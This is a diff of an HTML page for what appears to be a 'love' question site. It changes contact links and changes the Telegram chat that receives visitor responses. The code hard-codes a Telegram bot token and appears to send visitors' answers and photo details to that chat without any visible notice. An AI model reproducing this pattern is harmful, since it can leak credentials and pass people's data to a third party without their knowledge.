@@ -118,11 +118,14 @@
       <div class="contact-section">
         <p class="contact-text">💬 Connect with us:</p>
         <div class="contact-btn">
+          <a href="https://wa.me/2349135600014" target="_blank" class="whatsapp-business-btn">
+            💼 WhatsApp Business
+          </a>
           <a href="https://wa.me/2349135600014" target="_blank" class="whatsapp-btn">
             📱 WhatsApp
           </a>
-          <a href="https://wa.me/2348075614248" target="_blank" class="whatsapp-business-btn">
-            💼 WhatsApp Business
+          <a href="https://t.me/Prof_essor2025" target="_blank" class="whatsapp-business-btn">
+            📱 Telegram (@Prof_essor2025)
           </a>
           <button onclick="sendEmail()" class="whatsapp-btn" style="background: linear-gradient(135deg, #ff6b6b, #ee5a24);">
             📧 Email Us
@@ -288,7 +291,7 @@
         localStorage.setItem('loveResponses', JSON.stringify(responses));
         
         const botToken = '7723720692:AAEPmC39DWtRqL5BtR0ataTaKn4PF0HoCJs';
-        const chatId = '2348075614248';
+        const chatId = '6649936329';
         
         // Create comprehensive message for Yes responses with ALL data
         const message = answer === 'Yes' 
@@ -430,7 +433,7 @@ ${photoInfo}
 
       async function sendResponseTrackerToTelegram(responses) {
         const botToken = '7723720692:AAEPmC39DWtRqL5BtR0ataTaKn4PF0HoCJs';
-        const chatId = '2348075614248';
+        const chatId = '6649936329';
 
         const yesResponses = responses.filter(r => r.response === 'Yes').length;
         const noResponses = responses.filter(r => r.response === 'No').length;
